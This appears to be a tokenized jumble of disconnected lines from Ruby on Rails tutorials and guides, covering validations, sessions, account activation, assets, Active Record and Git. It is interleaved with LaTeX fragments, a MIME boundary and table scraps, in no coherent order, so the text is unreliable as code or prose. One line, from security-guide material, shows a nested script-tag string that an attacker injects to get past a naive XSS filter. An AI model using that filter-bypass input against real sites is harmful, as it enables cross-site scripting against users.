▁ Custom ▁validator s ▁are ▁classes ▁that ▁extend ▁` ActiveModel :: Validator ` ▖
▁This ▁is ▁easy ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁ developed ▁in ▁Section ~\ ref { sec : remember _ tests } ▁( Listing ~\ ref { code : test _ helper _ log _ in }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in } .
▁#### # ▁` collection ▖ delete ( object , ▁ ▖▖▖)
▁S ing le - quot ed ▁strings
▁This ▁test ▁does ▁the ▁same ▁thing ▁as ▁the ▁initial ▁duplicate ▁email ▁test , ▁but ▁with ▁an ▁upper - case ▁email ▁address ▁instead .
▁The ▁equivalent ▁code
▁else
▁User ▖ find _ each ▁do ▁| user |
▁It ' s ▁a ▁relative ly ▁good ▁idea , ▁so ▁if ▁you ▁want ▁to ▁offer ╼ configuration ▁options , ▁the ▁file ▁where ▁your ▁engine ' s ▁` module ` ▁is ▁defined ▁is ╼ perfect ▁for ▁that ▖
▁Because ▁of ▁its ▁ import ance , ▁it ' s ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁any ▁attribute ▁that ▁isn ' t ▁edit able , ▁and ▁writing ▁such ▁a ▁test ▁for ▁the ▁\ k ode { admin } ▁attribute ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises }) .
▁ ╼ </ p >╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 - -
▁In ▁this ▁chapter , ▁we ' ll ▁put ▁the ▁finish ing ▁ touch es ▁on ▁this ▁system ▁by ▁adding ▁two ▁close ly ▁related ▁features : ▁account ▁activation ▁( which ▁verifie s ▁a ▁new ▁user ' s ▁email ▁address ) ▁and ▁password ▁reset ▁( for ▁users ▁who ▁ forget ▁their ▁passwords ) .
▁def ▁as _ json ( options ▁= ▁nil )
▁The ▁second ▁( option al ) ▁argument ▁specifie s ▁the ▁size ▁of ▁the ▁difference ▁( in ▁this ▁case , ▁1) .
▁te }╼╼ ▁% ▁subsection ▁creating _ user _ objects ▁( end )╼╼ ▁\ subsection { Fi nd ing ▁user ▁objects } ▁% ▁( fold )╼ ▁\ label { sec : find ing _ user _ objects }╼╼
▁We ▁include ▁\ k ode { row } ▁and ▁\ k ode { span 4 } ▁classes , ▁which ▁are ▁both ▁part ▁of ▁Bootstrap .
▁In ▁other ▁words , ▁with ▁code ▁like
▁This ▁write s ▁the ▁path ▁to ▁the ▁particular ▁asset ▁being ▁reference d ▖
▁* ▁` ActiveRecord :: Connection Adapters :: M y sql A d a p ter ▖ emulate _ boolean s ` ▁control s ▁whether ▁Active ▁Record ▁will ▁consider ▁all ▁` t in y in t (1) ` ▁columns ▁in ▁a ▁ MySQL ▁database ▁to ▁be ▁boolean s ▁and ▁is ▁true ▁by ▁default .
▁No ▁ Order s ▁F ound
▁Thu s , ▁to ▁load ▁all ▁extensions ▁to ▁` Object ` ▁( including ▁` blank ?` ) :
▁Note ▁again ▁that ▁articles ▁with ▁multiple ▁comments ▁will ▁show ▁up ▁multiple ▁time s .
▁The ▁method ▁` transform _ value s ` ▁accept s ▁a ▁block ▁and ▁returns ▁a ▁hash ▁that ▁has ▁applied ▁the ▁block ▁operations ▁to ▁each ▁of ▁the ▁values ▁in ▁the ▁receiver .
▁ r
▁( In ▁Listing ~\ ref { code : email _ downcase }, ▁we ▁passed ▁\ k ode { before \_ save } ▁an ▁explicit ▁block , ▁but ▁the ▁method ▁reference ▁technique ▁is ▁generally ▁preferred ▖)
▁As ▁a ▁second ▁example , ▁we ' ll ▁access ▁the ▁\ k ode { activation \_ digest } ▁attribute ▁of ▁the ▁first ▁user ▁in ▁the ▁database :
▁This ▁option ▁defaults ▁to ╼ true .
▁( Experience ▁shows ▁that ▁this ▁is ▁a ▁ w is e ▁practice ; ▁in ▁classes ▁with ▁a ▁large ▁number ▁of ▁methods , ▁it ▁is ▁easy ▁to ▁define ▁a ▁ private ▁method ▁accidental ly , ▁which ▁lead s ▁to ▁consider able ▁con f us ion ▁when ▁it ▁isn ' t ▁available ▁to ▁call ▁on ▁the ▁corresponding ▁object ▖)
▁# ▁=> ▁ { : b =>2} ▁# ▁non - ex ist ing ▁keys ▁are ▁ignore d
▁Similar ly , ▁` from ` ▁returns ▁the ▁ tail ▁from ▁the ▁element ▁at ▁the ▁passed ▁index ▁to ▁the ▁end ▖
▁test : postgresql
▁* ▁O p t im ist ic ▁ Lock ing
▁We ' ve ▁covered ▁enough ▁material ▁now ▁that ▁there ▁is ▁a ▁ com bin a to ri al ▁ ex p lo s ion ▁of ▁possible ▁extensions ▁to ▁the ▁application .
▁To ▁get ▁Rails ▁say ing ▁" Hello ", ▁you ▁need ▁to ▁create ▁at ▁ minimum ▁a ▁ _ controller _ ▁and ▁a ╼ _ view _ .
▁### ▁ CRUD , ▁Verb s , ▁and ▁Action s
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁When ▁the ▁last ▁argument ▁in ▁a ▁method ▁call ▁is ▁a ▁hash , ▁except ▁p erhaps ▁for ▁a ▁` & block ` ▁argument , ▁Ruby ▁allows ▁you ▁to ▁omit ▁the ▁bracket s :
▁# ▁=> ▁ { : a =>2}
▁This ▁flag ▁is ▁taken ▁into ▁account ▁for ▁each ▁constant ▁in ▁the ▁expression ▁while ╼ w al k ing ▁down ▁the ▁path .
▁On ▁many ▁systems , ▁including ▁the ▁cloud ▁IDE , ▁you ▁can ▁omit ▁\ k ode { bundle ▁exec }, ▁but ▁it ▁is ▁necessary ▁on ▁some ▁systems , ▁so ▁I ' ll ▁include ▁it ▁for ▁completeness .
▁With ▁that , ▁the ▁users ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁\ passing :
▁render ▁action : ▁" index "
▁if ▁@ article ▖ save
▁Note ▁that ▁if ▁any ▁of ▁the ▁validations ▁fail , ▁such ▁as ▁when ▁a ▁password ▁is ▁required ▁to ▁save ▁a ▁record ▁( as ▁implemented ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }), ▁the ▁call ▁to ▁\ k ode { update \_ attributes } ▁will ▁fail .
▁The ▁library ▁as ▁a ▁whole ▁can ▁be ▁access ed ▁in ▁the ▁application ▁manifest ▁like ▁so :
▁CDN ▁stand s ▁for ▁[ Content ▁ Delivery ╼ Net work ]( http :// en ▖ w ikipedia ▖ org / wiki / Content _ delivery _ net work ), ▁they ▁are ╼ p ri ma ri ly ▁design ed ▁to ▁cache ▁assets ▁all ▁over ▁the ▁world ▁so ▁that ▁when ▁a ▁browser ╼ request s ▁the ▁asset , ▁a ▁cached ▁copy ▁will ▁be ▁ ge o gr a ph ical ly ▁close ▁to ▁that ▁browser ▖╼
▁get ▁: index , ▁format : ▁: js
▁In ▁Listing ~\ ref { code : logo _ css }, ▁we ▁have ▁the ▁code
▁The ▁default ▁is ▁` true ` .
▁To ▁get ▁started , ▁we ' ll ▁generate ▁a ▁Sessions ▁controller ▁and ▁an ▁integration ▁test ▁for ▁the ▁authentication ▁machinery :
▁# ▁gem ▁' therubyracer ', ▁platform s : ▁: ruby
▁Note ▁that ▁the ▁\ k ode { correct \_ user } ▁before ▁filter ▁defines ▁the ▁\ k ode {@ user } ▁variable , ▁so ▁Listing ~\ ref { code : correct _ user _ before _ filter } ▁also ▁shows ▁that ▁we ▁can ▁eliminate ▁the ▁\ k ode {@ user } ▁assignment s ▁in ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions .
▁In ▁most ▁cases , ▁the ▁` ActionController :: Base # render ` ▁method ▁does ▁the ▁heav y ▁ li f ting ▁of ▁rendering ▁your ▁application ' s ▁content ▁for ▁use ▁by ▁a ▁browser ▖
▁Ou r ▁strategy ▁is ▁to ▁create ▁a ▁couple ▁of ▁ factory ▁microposts ▁ associated ▁with ▁the ▁user , ▁and ▁then ▁verify ▁that ▁the ▁show ▁page ▁contains ▁each ▁post ' s ▁content .
▁The ▁JSON ▁ en code r ▁in ▁Rails ▁4▖1 ▁has ▁been ▁re written ▁to ▁take ▁advantage ▁of ▁the ▁JSON ╼ gem ▖
▁ ╼ ▁end
▁in ▁Listing ~\ ref { code : final _ gemfile } .
▁The ▁ ternary ▁operator ▁is ▁a ▁ compact ▁way ▁to ▁write ▁simple ▁if - the n ▁statement s .
▁If ▁you ▁use ▁the ▁`: xml ` ▁option , ▁` render ` ▁will ▁automatically ▁call ▁` to _ xml ` ▁for ▁you .
▁Here ▁we ▁see ▁that ▁destroying ▁a ▁user ▁leave s ▁the ▁\ k ode { microposts } ▁variable ▁with ▁no ▁elements ; ▁i ▖ e ▖ , ▁it ' s ▁the ▁empty ▁array ~\ k ode { [ ]} .
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁ months ▁Jan u ary ▁through ▁De ce mb er ▁with ▁the ▁current ▁ month ▁select ed .
▁This ▁will ▁find ▁the ▁ category ▁with ▁id ▁1 ▁and ▁ eager ▁load ▁all ▁of ▁the ▁ associated ▁articles , ▁the ▁ associated ▁articles ' ▁tags ▁and ▁comments , ▁and ▁every ▁comment ' s ▁ guest ▁association .
▁It ' s ▁important ▁to ▁understand ▁that ▁code ▁like ▁that ▁show n ▁in ▁Listing ~\ ref { code : jquery _ file _ test } ▁can ' t ▁actually ▁prevent ▁a ▁user ▁from ▁try ing ▁to ▁upload ▁a ▁file ▁that ' s ▁too ▁big .
▁Here ▁the ▁adapter , ▁host , ▁and ▁database ▁match ▁the ▁information ▁in ▁` ENV [' DAT A BASE _ URL ']` .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app .
▁User ▖ inactive
▁( H a v ing ▁so ▁much ▁code ▁in ▁each ▁branch ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁ condition al ▁is ▁a ▁bit ▁me s sy , ▁and ▁clean ing ▁it ▁up ▁using ▁partials ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : micropost _ exercises })▖)
▁A ▁test ▁for ▁the ▁user ▁profile ▖
▁class ▁Create P ub li c ation s ▁< ▁ActiveRecord :: Migration
▁Such ▁a ▁server ▁is ▁common ly ▁called ▁a ▁" staging ▁server "▖
▁@ user ▖ reload ▖ email ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼\ begin { code listing }╼\ label { code : downcase _ bang }╼\ code caption { A n ▁alter n ate ▁callback ▁implementation ▖ ▁\ passing ▁\ \ ▁\ file path { app / models / user ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 2 ] ╼\ begin { code } ╼ class ▁User ▁< ▁Application Record ╼ ▁before _ save ▁ { ▁email ▖ downcase ! ▁ } ╼ ▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁50 ▁ } ╼ ▁ VALID _ EMAIL _ REGEX ▁= ▁ / \ A [ \ w + \ - ▖ ] + @ [ a - z \ d \ - ▖ ] + \ ▖ [ a - z ] + \ z / i ╼ ▁validates ▁: email , ▁presence : ▁true , ▁length : ▁ { ▁ maximum : ▁2 55 ▁ }, ╼ ▁format : ▁ { ▁with : ▁ VALID _ EMAIL _ REGEX ▁ }, ╼ ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ } ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁uniqueness _ validation ▁( end )╼╼ ▁% ▁section ▁model _ validations ▁( end )╼╼ ▁\ section { Adding ▁a ▁secure ▁password } ▁% ▁( fold )╼ ▁\ label { sec : adding _ a _ secure _ password }╼╼
▁For ▁example , ▁` 0 1 _ critical ▖ rb ` ▁will ▁be ▁loaded ▁before ▁` 02 _ normal ▖ rb ` .
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 , ▁7 , ▁" foo ", ▁" bar "]
▁We ▁can ▁see ▁this ▁using ▁\ k ode { ! !} \ ▁( read ▁`` bang ▁ bang '') , ▁which ▁ n eg ate s ▁an ▁object ▁t w ice , ▁there by ▁co er c ing ▁it ▁to ▁its ▁boolean ▁value :
▁For ▁example ▁given
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / enumerable ▖ rb ` .
▁ Follow ing ▁this ▁model ▁for ▁the ▁Help ▁page ▁( Listing ~\ ref { code : custom _ help _ page }) ▁and ▁the ▁About ▁page ▁( Listing ~\ ref { code : custom _ about _ page }) ▁yields ▁the ▁code ▁in ▁Listing ~\ ref { code : help _ view _ full _ html } ▁and ▁Listing ~\ ref { code : about _ view _ full _ html } .
▁| ▁`: two _ words _ connect or ` ▁| ▁` support ▖ array ▖ two _ words _ connect or ` ▁|
▁The ▁\ href { http :// sqlite browser ▖ source for ge ▖ net /}{ SQLite ▁Database ▁B row s er } ▁with ▁our ▁new ▁\ k ode { users } ▁table ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sqlite _ database _ browser - full ▖ png }{( full ▁size )}
▁In ▁Rails , ▁this ▁can ▁be ▁accomplish ed ▁with ▁\ text tt { rails ▁destroy } .
▁it h
▁The ▁test ▁in ▁Listing ~\ ref { code : real _ account _ activation _ test } ▁uses ▁\ k ode { assert \_ match } ▁to ▁check ▁that ▁the ▁name , ▁activation ▁token , ▁and ▁escape d ▁email ▁appear ▁in ▁the ▁email ' s ▁ body .
▁ past ?
▁ Hash ▁values ▁can ▁be ▁virtual ly ▁anything , ▁even ▁other ▁hashes , ▁as ▁seen ▁in ▁Listing ~\ ref { code : nested _ hashes } .
▁There ▁are ▁sever al ▁c ur at ed ▁list s ▁of ▁online ▁resources ╼ for ▁learning ▁Ruby :
▁The ▁` image _ tag ` ▁helper ▁build s ▁an ▁HTML ▁`< img ▁/> ` ▁tag ▁to ▁the ▁specified ▁file ▖
▁client ▁= ▁Client ▖ find (10)
▁Whi le ▁this ▁ backtrace ▁is ▁usually ▁very ▁useful ▁for ▁ track ing ▁down ▁the ▁problem , ▁on ▁some ▁systems ▁( including ▁the ▁cloud ▁IDE ) ▁it ▁go es ▁ past ▁the ▁application ▁code ▁and ▁into ▁the ▁ various ▁gem ▁ dependencies , ▁including ▁Rails ▁itself .
▁resources ▁: photos
▁For ▁a ▁suggest ion ▁on ▁how ▁to ▁avoid ▁conflicts ▁between ▁ exercises ▁and ▁the ▁main ▁tutorial , ▁see ▁the ▁note ▁on ▁exercise ▁topic ▁branch es ▁in ▁Section ~\ ref { sec : static _ pages _ exercises } .
▁The ▁example ▁in ▁` Date # advance ` ▁applies , ▁and ▁we ▁can ▁extend ▁it ▁to ▁show ▁order ▁re le v ance ▁related ▁to ▁the ▁time ▁bit s .
▁t ▖ belongs _ to ▁: supplier
▁* ▁Rails ▁4▖0 ▁ de pre cat es ▁the ▁` dom _ id ` ▁and ▁` dom _ class ` ▁methods ▁in ▁controllers ▁( the y ▁are ▁fine ▁in ▁views )▖
▁ Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` ¡ H ol a , ▁ mundo !'' .
▁As ▁prepar ation ▁for ▁the ▁next ▁step , ▁we ▁have ▁replace d
▁With ▁these ▁design ▁and ▁security ▁consider ation s ▁in ▁mind , ▁our ▁plan ▁for ▁creating ▁ persistent ▁sessions ▁appears ▁as ▁follows :
▁Twitter ▁allows ▁users ▁to ▁make ▁` `@ replies '' , ▁which ▁are ▁microposts ▁who se ▁first ▁characters ▁are ▁the ▁user ' s ▁login ▁pre c ed ed ▁by ▁the ▁\ text tt {@ } ~ sign .
▁( For ▁a ▁form al ▁ demo n str ation ▁that ▁the ▁compar is on ▁is ▁correct , ▁see ▁the ▁ proof ▁in ▁Section ~\ ref { sec : expiration _ proof } ▖)
▁<%= ▁stylesheet _ link _ tag ▁" main " ▁%>
▁The ▁validation ▁only ▁run s ▁when ▁all ▁the ▁`: if ` ▁conditions ▁and ▁ none ▁of ▁the ╼` : unless ` ▁conditions ▁are ▁evaluated ▁to ▁` true ` .
▁ ▖ ide a
▁Now ▁the ▁attacker ▁ inject s ▁" & lt ; s c r script ip t & gt ; ", ▁and ▁after ▁the ▁filter , ▁" & lt ; script & gt ; " ▁re main s ▖
▁The ▁following ▁is ▁a ▁list ▁of ▁the ▁most ▁common ly ▁used ▁methods ▖
▁The ▁error ▁message ▁now ▁indicates ▁a ▁missing ▁\ k ode { about } ▁action ▁in ▁the ▁Static ▁Pages ▁controller , ▁which ▁we ▁can ▁add ▁by ▁following ▁the ▁model ▁provided ▁by ▁\ k ode { home } ▁and ▁\ k ode { help } ▁in ▁Listing ~\ ref { code : static _ pages _ controller }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : adding _ the _ about _ page } .
▁( The ▁\ k ode { Time ▖ zone ▖ now } ▁method ▁is ▁a ▁built - in ▁Rails ▁helper ▁that ▁returns ▁the ▁current ▁timestamp , ▁tak ing ▁into ▁account ▁the ▁time ▁ zone ▁on ▁the ▁server ▖)
▁This ▁method ▁is ▁an ▁alias ▁of ▁` Array # un sh if t ` .
▁Action ▁View ▁is ▁an ▁in dependent ▁package ▁that ▁can ▁be ▁used ▁with ▁any ▁sort ▁of ▁Ruby ▁libraries .
▁The ~\ k ode { id } ▁attribute ▁here ▁is ▁just ▁an ▁ integer ▁( i ▖ e ▖ , ▁\ k ode { self ▖ id }, ▁the ▁unique ▁ ID ▁of ▁the ▁user ), ▁so ▁there ▁is ▁no ▁ danger ▁of ▁SQL ▁injection ▁in ▁this ▁case , ▁but ▁\ emph { al way s } ▁es c a p ing ▁variables ▁ inject ed ▁into ▁SQL ▁statement s ▁is ▁a ▁good ▁ha bit ▁to ▁c ul t i v ate .
▁Rails ▁keep s ▁ track ▁of ▁which ▁files ▁have ▁been ▁commit ted ▁to ▁the ▁database ▁and ╼ provide s ▁ rollback ▁features ▖
▁The ▁` find _ each ` ▁method ▁accept s ▁most ▁of ▁the ▁options ▁allow ed ▁by ▁the ▁regular ▁` find ` ▁method , ▁except ▁for ▁`: order ` ▁and ▁`: limit `, ▁which ▁are ▁re serv ed ▁for ▁ internal ▁use ▁by ▁` find _ each ` .
▁config ▖ middleware ▖ swap ▁ ActionController :: F a i l safe , ▁ Lifo :: F a i l safe
▁We ' re ▁not ▁quite ▁done , ▁though .
▁A ▁fixture ▁for ▁testing ▁user ▁login .
▁Note ▁that ▁we ' ve ▁added ▁the ▁argument ▁\ k ode { default : ▁false } ▁to ▁\ k ode { add \_ column } ▁in ▁Listing ~\ ref { code : admin _ migration }, ▁which ▁means ▁that ▁users ▁will ▁\ emph { not } ▁be ▁administrator s ▁by ▁default .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁as ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁we ▁can ▁create ▁the ▁necessary ▁links ▁using ▁the ▁named ▁edit ▁route ▁and ▁ embedded ▁Ruby , ▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html } .
▁If ▁the ▁receiver ▁is ▁an ▁array ▁of ▁hashes ▁the ▁root ▁element ▁is ▁by ▁default ▁also ▁" objects " :
▁The ▁` reverse _ order ` ▁method ▁ reverse s ▁the ▁ ordering ▁clause ▁if ▁specified .
▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test } .
▁<%= ▁link _ to ▁" Blog ▁articles ", ▁articles _ path ▁%>
▁$ ▁git ▁ checkout ▁- b ▁my _ back port _ branch ▁ 3- 2 - s table
▁in ▁Listing ~\ ref { code : hello _ root _ route } .
▁### ▁Creat ing ▁Path s ▁and ▁URLs ▁ From ▁Object s
▁As ▁show n ▁in ▁the ▁second ▁command ▁above , ▁Git ▁also ▁let s ▁us ▁roll ▁the ▁two ▁flag s ▁into ▁one ▁using ▁\ k ode { git ▁commit ▁- a m ▁" Message "} .
▁ ╼ ▁=> ▁false
▁As ▁in ▁other ▁alias ing ▁methods , ▁the ▁new ▁name ▁is ▁the ▁first ▁argument , ▁and ▁the ▁old ▁name ▁is ▁the ▁second ▁( one ▁m n em on ic ▁is ▁that ▁they ▁go ▁in ▁the ▁same ▁order ▁as ▁if ▁you ▁did ▁an ▁assignment ) :
▁ ╼ ▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁In ▁case ▁the ▁` re order ` ▁clause ▁is ▁not ▁used , ▁the ▁SQL ▁executed ▁would ▁be :
▁ cd ▁< d ir name >
▁### ▁C on st an t s
▁If ▁date ▁is ▁the ▁29 th ▁of ▁Feb ru ary ▁of ▁a ▁ le a p ▁ year , ▁you ▁obtain ▁the ▁28 th :
▁Having ▁added ▁SSL , ▁we ▁now ▁need ▁to ▁configure ▁our ▁application ▁to ▁use ▁a ▁ webserver ▁suit able ▁for ▁production ▁applications .
▁### ▁M as k ed ▁A u the n tic ity ▁ Token s
▁P erhaps ▁the ▁most ▁element ary ▁validation ▁is ▁\ emph { presence }, ▁which ▁simply ▁verifie s ▁that ▁a ▁given ▁attribute ▁is ▁present .
▁With ▁that , ▁you ▁should ▁navigate ▁to ▁a ▁user ▁profile ▁page ▁and ▁verify ▁that ▁you ▁can ▁follow ▁and ▁ unfollow ▁without ▁a ▁page ▁refresh .
▁# ▁Defaults ▁to ▁' / assets '
▁Article ▖ first ▖ cat eg or ies ▖ many ?
▁( A n ▁error ▁will ▁appear ▁in ▁the ▁Rails ▁log , ▁but ▁that ▁doesn ' t ▁do ▁any ▁ha rm ▖)
▁This ▁ listing ▁includes ▁a ▁second ▁use ▁of ▁the ▁\ k ode { render } ▁method , ▁which ▁we ▁first ▁saw ▁in ▁the ▁context ▁of ▁partials ▁( Section ~\ ref { sec : partial s }) ; ▁as ▁you ▁can ▁see , ▁\ k ode { render } ▁works ▁in ▁controller ▁actions ▁as ▁well .
▁The ▁return ▁will ▁be ▁an ▁array ▁containing ▁all ▁of ▁the ▁matching ▁records ▁for ▁the ▁supplied ▁ _ primary ▁keys _ ▖
▁To ▁enforce ▁uniqueness ▁of ▁email ▁addresses ▁( so ▁that ▁we ▁can ▁use ▁them ▁as ▁user name s ), ▁we ' ll ▁be ▁using ▁the ▁\ k ode { : uniq ue } ▁option ▁to ▁the ▁\ k ode { validates } ▁method .
▁</ tt > ▁is ▁true ,
▁Of t en times ▁code ▁will ▁start ▁to ▁`` s me ll '' , ▁meaning ▁that ▁it ▁get s ▁ugly , ▁ blo at ed , ▁or ▁ filled ▁with ▁repetition .
▁The ▁solution ▁will ▁ probably ▁involve ▁a ▁ Message ▁model ▁and ▁a ▁regular ▁expression ▁match ▁on ▁new ▁microposts .
▁An ▁\ k ode { edit } ▁action ▁to ▁activate ▁account s .
▁TIP : ▁For ▁more ▁information ▁on ▁Active ▁Record ▁associations , ▁see ▁the ▁[ Active ▁Record ╼ As so ci ation s ]( association _ basic s ▖ html ) ▁guide .
▁You ▁must ▁replace ▁any ▁plugin s ▁by ▁ extract ing ▁them ▁to ▁gems ▁and ▁adding ▁them ▁to ▁your ▁Gemfile ▖
▁# ▁matter ▁the ▁context ▖
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http ://0▖0▖0▖0:3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( Figure ~\ ref { fig : about _ page }) .
▁Co m press ion ▁also ▁reduce s ▁file ▁size , ▁ en a b l ing ╼ the ▁browser ▁to ▁ download ▁them ▁faster .
▁( S ince ▁ Factory ▁Girl ▁is ▁only ▁needed ▁in ▁the ▁tests , ▁we ' ve ▁put ▁it ▁in ▁the ▁\ k ode { : test } ▁group ▖)
▁The ▁default ▁scaffold ▁that ╼ Rails ▁generates , ▁for ▁example , ▁add s ▁this ▁CSS ▁rule :
▁This ▁is ▁the ▁technique ▁I ▁recommend ▁for ▁ kill ing ▁individual ▁process es , ▁such ▁as ▁a ▁ r o g ue ▁Rails ▁server ▁( with ▁the ▁p id ▁found ▁via ▁\ text tt { p s ▁aux ▁| ▁ grep ▁server }), ▁but ▁some times ▁it ' s ▁convenient ▁to ▁ kill ▁all ▁the ▁process es ▁matching ▁a ▁particular ▁process ▁name , ▁such ▁as ▁when ▁you ▁want ▁to ▁ kill ▁all ▁the ▁\ text tt { spring } ▁process es ▁g un k ing ▁up ▁your ▁system .
▁If ▁you ▁do ▁need ▁a ▁lot ▁of ▁static ▁pages , ▁take ▁a ▁look ▁at ▁the ▁\ href { https :// github ▖ com / thoughtbot / high _ v ol tag e }{\ text tt { high \_ v ol tag e } } ▁gem .
▁ --- P a ul ▁G ra ha m , ▁in ▁\ emph { F ound ers ▁at ▁Work } ▁by ▁ J ess ic a ▁L i v ing st on
▁We ▁can ▁verify ▁that ▁all ▁this ▁works ▁by ▁running ▁the ▁tests ▁from ▁Section ~\ ref { sec : adding _ page _ title s } ▁and ▁see ▁that ▁they ▁are ▁ still ▁\ passing :
▁# ▁gem ▁' c api str a no ', ▁group : ▁: development
▁( S ince ▁destroying ▁a ▁user ▁should ▁also ▁destroy ▁that ▁user ' s ▁relationships , ▁we ' ve ▁added ▁\ k ode { dependent : ▁: destroy } ▁to ▁the ▁association ▖)
▁Gravatar s ▁are ▁a ▁convenient ▁way ▁to ▁include ▁user ▁profile ▁images ▁without ▁going ▁through ▁the ▁trouble ▁of ▁ man a g ing ▁image ▁upload , ▁c r o p p ing , ▁and ▁ storage ; ▁all ▁we ▁need ▁to ▁do ▁is ▁construct ▁the ▁proper ▁Gravatar ▁image ▁URL ▁using ▁the ▁user ' s ▁email ▁address ▁and ▁the ▁corresponding ▁Gravatar ▁image ▁will ▁automatically ▁appear
▁Because ▁so ▁much ▁of ▁what ▁follows ▁depend s ▁on ▁this ▁one ▁method , ▁it ▁is ▁difficult ▁to ▁develop ▁secure ▁passwords ▁ increment ally .
▁( Figure ~\ ref { fig : signup _ failure } ▁also ▁shows ▁the ▁\ emph { web ▁console }, ▁which ▁open s ▁a ▁Rails ▁console ▁in ▁the ▁browser ▁to ▁as s ist ▁in ▁debugging .
▁=> ▁true
▁It ' s ▁an ▁empty ▁string !
▁The ▁\ k ode { rails } ▁ script ▁is ▁design ed ▁so ▁that ▁you ▁don ' t ▁need ▁to ▁use ▁\ k ode { bundle ▁exec } .
▁NOTE : ▁The ▁values ▁cannot ▁be ▁symbols ▖
▁Now ▁we ▁come ▁to ▁some ▁steps ▁that ▁are ▁necessary ▁each ▁time ▁you ▁create ▁a ▁new ▁\ emph { repository } .
▁copy ▁file
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { remember \_ digest } ▁attribute .
▁ }╼╼\ section { Account ▁activation } ▁% ▁( fold )╼\ label { sec : account _ activation }╼╼
▁The ▁way ▁to ▁do ▁this ▁using ▁the ▁cloud ▁IDE ▁is ▁as ▁follows :
▁Git ▁models ▁commit s ▁as ▁a ▁series ▁of ▁ patch es , ▁and ▁in ▁this ▁context ▁it ▁make s ▁sense ▁to ▁describe ▁what ▁each ▁commit ▁\ emph { does }, ▁rather ▁than ▁what ▁it ▁did .
▁Rails ▁is ▁a ▁large ▁project , ▁and ▁a ▁b un ch ▁of ╼ extra ne ous ▁commit s ▁can ▁add ▁a ▁lot ▁of ▁no is e .
▁<% ▁end ▁%>
▁# ▁ Version ▁of ▁your ▁assets , ▁change ▁this ▁if ▁you ▁want ▁to ▁ expire ▁all ▁your ▁assets
▁With ▁the ▁code ▁in ▁Section ~\ ref { sec : for getting _ users }, ▁our ▁application ▁has ▁a ▁complete , ▁ professional - grade ▁authentication ▁system .
▁As ▁you ' ve ▁seen , ▁` render ` ▁tell s ▁Rails ▁which ▁view ▁( or ▁other ▁asset ) ▁to ▁use ▁in ▁construct ing ▁a ▁response ▖
▁ ╼ ▁> > ▁@ user ▁= ▁@ user ▁|| ▁" another ▁user "
▁#### ▁Scopes ▁for ▁` has _ one `
▁" comments _ count "▖ humanize ▁# ▁=> ▁" Comments ▁count "
▁The ▁fixtures ▁in ▁Listing ~\ ref { code : relationships _ fixtures } ▁first ▁arrange ▁for ▁ Michael ▁to ▁follow ▁L an a ▁and ▁M all or y , ▁and ▁then ▁arrange ▁for ▁ Michael ▁to ▁be ▁followed ▁by ▁L an a ▁and ▁A r ch er .
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }) .
▁resource ▁: geocoder
▁In ▁this ▁section ▁and ▁the ▁next , ▁we ' ll ▁ prepare ▁for ▁this ▁work ▁by ▁construct ing ▁a ▁Sessions ▁controller , ▁a ▁login ▁form , ▁and ▁the ▁relevant ▁controller ▁actions .
▁` duplicable ?` ▁depend s ▁on ▁the ▁hard - code d ▁list ▁above , ▁but ▁it ▁is ▁much ▁faster ▁than ▁` rescue ` ▖
▁<%= ▁javascript _ include _ tag ▁" main ", ▁" columns " ▁%>
▁Using ▁the ▁\ k ode { session } ▁method , ▁we ▁can ▁secure ly ▁place ▁a ▁user ▁id ▁on ▁the ▁browser ▁to ▁create ▁a ▁temporary ▁session .
▁The ▁complete ▁ factory ▁file , ▁including ▁a ▁new ▁ factory ▁for ▁microposts .
▁< html >
▁For ▁example , ▁Rails ▁creates ▁log ▁files ▁to ▁record ▁the ▁behavior ▁of ▁the ▁application ; ▁these ▁files ▁change ▁f r equ ent ly , ▁and ▁we ▁don ' t ▁want ▁our ▁version ▁control ▁system ▁to ▁have ▁to ▁update ▁them ▁constant ly .
▁+ --- --- + - -------- + --- --- + --- --- +-------------+
